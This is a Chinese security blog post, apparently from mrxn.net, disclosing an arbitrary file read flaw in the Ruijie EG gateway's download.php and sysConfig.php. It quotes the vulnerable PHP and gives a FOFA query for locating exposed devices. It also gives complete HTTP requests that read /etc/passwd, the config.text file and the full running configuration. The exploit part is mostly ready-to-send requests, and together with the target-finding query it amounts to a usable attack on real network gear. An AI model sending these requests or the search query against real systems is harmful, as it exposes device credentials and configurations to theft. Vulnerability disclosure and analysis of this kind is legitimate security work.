---
title: "锐捷-EWEB download.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-download-fileread.html
asset_dir: assets/锐捷-eweb-download.php-文件读取漏洞
---

# 锐捷-EWEB download.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/7 10:22
- 907浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

计算机安全

安全工具开发

软件

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `download.php` 的 `readFileAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞扫描服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `read_txtAction` 的实现逻辑

```
public function read_txtAction()
    {
        $filename = v("file");
        if (!file_exists($filename)) {
            $data["status"] = 2;
            $data["msg"] = $filename . "不存在";
            json_echo($data);
            exit();
        } else {
            $fileContent = file_get_contents($filename);
            $data = array("status" => true, "data" => $fileContent);
            json_echo($data);
        }
    }
```

深入探索

编程语言教程

在线安全工具

VPN服务

直接将 `file` 带入 `file_get_contents` 函数进行文件操作，造成任意文件读取漏洞。

再看 `download.php` 中的 `readFileAction` 方法实现

```
public function readFileAction() {
        $filename = '/data/' . p("name");
        if (!file_exists($filename)) {
            $data = $filename . "不存在";
            echo($data);
            exit();
        } else {
            $data = file_get_contents($filename);
            echo($data);
        }
    }
```

直接将无任何过滤和校验 post 获取的 `name` 拼接在 `/data/` 后直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
GET /download.php?a=read_txt&file=/etc/passwd HTTP/1.1
Host: ruijieweb.mrxn.net
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
```

[![锐捷-EWEB download.php 文件读取漏洞](images/img-001-7a65879d8370.webp)](https://image.mrxn.net/efc01a77d4994853a7fec296ab72691c.webp)

```
POST /download.php?a=readFile HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

name=config.text
```

成功读取到 `config.text` 文件内容

漏洞扫描服务

[![锐捷-EWEB download.php 文件读取漏洞](images/img-002-9e3501c3731b.webp)](https://image.mrxn.net/b17fa8d2966e485dbcc08d19a0e06980.webp)

同样的，通过 sysConfig.php 的 showRunAction 也可以获取系统完整配置

```
GET /pub/sysConfig.php?a=showRun HTTP/1.1
Host: ruijieweb.mrxn.net
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
